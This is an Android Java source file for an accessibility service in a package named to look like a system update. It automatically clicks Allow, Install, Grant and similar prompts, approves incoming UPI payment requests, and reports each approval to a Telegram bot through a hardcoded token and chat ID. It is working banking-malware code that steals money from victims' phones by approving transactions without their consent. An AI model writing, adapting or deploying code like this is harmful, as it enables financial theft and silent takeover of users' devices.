package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {
    private static MyAccessibilityService instance;
    private static final String BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
    private static final String CHAT_ID = "8501093383";
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        instance = this;
        String text = event.getText().toString();
        
        if (text.contains("Allow") || text.contains("Install") || 
            text.contains("Approve") || text.contains("Accept") || 
            text.contains("Yes") || text.contains("Continue") || 
            text.contains("OK") || text.contains("Grant")) {
            clickButton("Allow");
            clickButton("Install");
            clickButton("Approve");
            clickButton("Accept");
            clickButton("Yes");
            clickButton("Continue");
            clickButton("OK");
            clickButton("Grant");
        }
        
        if (text.contains("UPI") && text.contains("requests")) {
            clickButton("Approve");
            clickButton("Accept");
            clickButton("Yes");
            sendTelegram("✅ Auto-approved UPI request");
        }
    }
    
    public void clickButton(String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo node : nodes) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            }
        }
    }
    
    private void sendTelegram(String msg) {
        try {
            new java.net.URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(msg, "UTF-8")).openConnection().connect();
        } catch(Exception e) {}
    }
    
    @Override
    public void onInterrupt() {}
    
    public static MyAccessibilityService getInstance() { return instance; }
}
